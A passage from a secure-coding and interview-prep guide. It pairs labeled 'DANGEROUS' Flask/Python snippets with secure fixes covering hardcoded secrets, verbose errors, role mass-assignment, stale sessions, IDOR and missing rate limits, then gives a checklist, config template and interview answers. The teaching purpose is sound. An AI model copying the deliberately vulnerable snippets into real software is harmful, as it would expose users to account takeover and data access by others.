    │    10.0.4.0/24                         │
    └───────────────────────────────────────┘
```

---

## Common Mistakes to Avoid

### 1. Hardcoded Secrets

```python
# DANGEROUS: Secrets in code
DATABASE_URL = "postgresql://admin:secretpassword@db.example.com/prod"
API_KEY = "sk_live_abc123xyz"

# SECURE: Use environment variables or secrets manager
import os
DATABASE_URL = os.environ['DATABASE_URL']
API_KEY = secrets_manager.get_secret('api_key')
```

### 2. Verbose Error Messages

```python
# DANGEROUS: Exposes internal details
try:
    user = db.query(User).filter_by(email=email).one()
except NoResultFound:
    return {"error": f"No user found with email {email} in table users"}, 404
except Exception as e:
    return {"error": str(e)}, 500  # May expose SQL, stack trace, etc.

# SECURE: Generic error messages, detailed logging
try:
    user = db.query(User).filter_by(email=email).one()
except NoResultFound:
    logger.info(f"Login attempt for non-existent email: {mask_email(email)}")
    return {"error": "Invalid credentials"}, 401
except Exception as e:
    logger.error(f"Database error during login: {e}", exc_info=True)
    return {"error": "An error occurred. Please try again."}, 500
```

### 3. Missing Input Validation

```python
# DANGEROUS: Trusting user input
def update_profile(user_id, data):
    user = User.query.get(user_id)
    user.role = data.get('role')  # User can make themselves admin!
    db.session.commit()

# SECURE: Validate and whitelist
ALLOWED_UPDATE_FIELDS = {'name', 'email', 'phone'}

def update_profile(user_id, data):
    user = User.query.get(user_id)

    for key, value in data.items():
        if key in ALLOWED_UPDATE_FIELDS:
            setattr(user, key, value)

    db.session.commit()
```

### 4. Broken Authentication Flow

```python
# DANGEROUS: Not invalidating sessions on password change
def change_password(user, new_password):
    user.password_hash = hash_password(new_password)
    db.session.commit()
    # Old sessions still valid!

# SECURE: Invalidate all sessions
def change_password(user, new_password):
    user.password_hash = hash_password(new_password)
    user.session_version += 1  # Invalidate all sessions
    db.session.commit()

    # Also invalidate cached sessions
    session_manager.destroy_all_user_sessions(user.id)
```

### 5. Insecure Direct Object Reference (IDOR)

```python
# DANGEROUS: No authorization check
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)
    return jsonify(order.to_dict())  # Anyone can access any order!

# SECURE: Check ownership
@app.route('/api/orders/<order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)

    if not order:
        return {"error": "Order not found"}, 404

    if order.user_id != current_user.id and not current_user.is_admin:
        return {"error": "Access denied"}, 403

    return jsonify(order.to_dict())
```

### 6. Missing Rate Limiting

```python
# DANGEROUS: No rate limiting on sensitive endpoints
@app.route('/api/login', methods=['POST'])
def login():
    # Attackers can brute force passwords
    pass

# SECURE: Rate limit sensitive endpoints
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # 5 attempts per minute
def login():
    pass

@app.route('/api/password-reset', methods=['POST'])
@limiter.limit("3 per hour")  # 3 resets per hour
def password_reset():
    pass
```

---

## Implementation Guidelines

### Security Implementation Checklist

```markdown
[ ] Authentication
    [ ] Strong password policy enforced
    [ ] Passwords hashed with bcrypt/argon2
    [ ] MFA available/required
    [ ] Session management secure
    [ ] Account lockout after failed attempts

[ ] Authorization
    [ ] Least privilege implemented
    [ ] RBAC or ABAC in place
    [ ] Resource-level authorization
    [ ] No direct object references

[ ] Data Protection
    [ ] Encryption at rest for sensitive data
    [ ] TLS for all communications
    [ ] Secrets properly managed
    [ ] Data masking in logs

[ ] Input Handling
    [ ] All input validated
    [ ] Parameterized queries used
    [ ] Output encoding applied
    [ ] File uploads validated

[ ] Security Headers
    [ ] HTTPS enforced (HSTS)
    [ ] CSP configured
    [ ] X-Frame-Options set
    [ ] X-Content-Type-Options set

[ ] Monitoring
    [ ] Security events logged
    [ ] Audit trail maintained
    [ ] Alerts configured
    [ ] Regular log review

[ ] Vulnerability Management
    [ ] Dependencies scanned
    [ ] Regular penetration testing
    [ ] Bug bounty program
    [ ] Patch management process
```

### Security Configuration Template

```yaml
# security_config.yaml
security:
  authentication:
    password:
      min_length: 12
      require_uppercase: true
      require_lowercase: true
      require_digit: true
      require_special: true
      max_age_days: 90

    session:
      ttl_seconds: 3600
      refresh_threshold: 300
      secure_cookie: true
      same_site: strict

    mfa:
      required: false
      totp_window: 1
      backup_codes_count: 10

    lockout:
      max_attempts: 5
      lockout_duration_minutes: 15

  rate_limiting:
    login:
      requests: 5
      period: minute
    api:
      requests: 100
      period: minute
    password_reset:
      requests: 3
      period: hour

  headers:
    hsts_max_age: 31536000
    csp_enabled: true
    frame_options: DENY

  encryption:
    algorithm: AES-256-GCM
    key_rotation_days: 90
```

---

## Interview Talking Points

### Question: "How would you secure a public-facing API?"

**Strong Answer Framework**:

1. **Authentication**: OAuth 2.0 or API keys with proper rotation
2. **Authorization**: RBAC with resource-level checks
3. **Transport**: TLS 1.2+ only, certificate pinning for mobile
4. **Rate Limiting**: Per-user and per-IP limits
5. **Input Validation**: Strict schema validation, sanitization
6. **Logging**: Audit trail, security event monitoring
7. **Defense in Depth**: WAF, API gateway, application controls

### Question: "Explain the principle of least privilege with examples."

**Key Points**:

1. **Definition**: Minimum permissions for the task
2. **Database**: Read-only accounts for queries, separate write accounts
3. **Services**: IAM roles with specific resource access
4. **Users**: Role-based permissions, time-limited elevation
5. **Benefits**: Reduces blast radius, limits insider threats

### Question: "How do you protect against SQL injection?"

**Key Points**:

1. **Parameterized Queries**: Never concatenate user input
2. **ORM**: Use framework query builders
3. **Input Validation**: Whitelist allowed characters
4. **Least Privilege**: Database accounts with minimal permissions
5. **WAF**: Additional layer of protection
6. **Testing**: Regular security scanning and pen testing

### Common Follow-up Questions

- How do you handle secret rotation?
- What's your approach to security logging?
- How do you implement secure session management?
- Explain your vulnerability management process

---

## Key Takeaways

### 1. Defense in Depth is Essential
- Multiple independent security layers
- No single point of failure
- Each layer provides protection

### 2. Least Privilege Limits Damage
- Minimum necessary permissions
- Time-limited elevated access
- Regular permission audits

### 3. Never Trust User Input
- Validate everything
- Use parameterized queries
- Encode output appropriately

### 4. Secrets Need Management
- Never hardcode secrets
- Use secrets managers
- Rotate credentials regularly

### 5. Monitor and Log Everything
- Security event logging
- Audit trails for compliance
- Alert on anomalies

### 6. Security is Ongoing
- Regular vulnerability scanning
- Penetration testing
- Stay updated on threats

---

## Quick Reference

| Aspect | Best Practice |
|--------|--------------|
| Password Storage | bcrypt/argon2 with salt |
| Session Tokens | 256-bit random, HTTPS only |
| TLS Version | 1.2 minimum, prefer 1.3 |
| Rate Limiting | 5/min login, 100/min API |
| Input Validation | Whitelist, not blacklist |
| Error Messages | Generic to users, detailed logs |
| Secrets | Environment vars or secrets manager |
| SQL Queries | Always parameterized |
| Headers | HSTS, CSP, X-Frame-Options |
| Logging | Audit all security events |
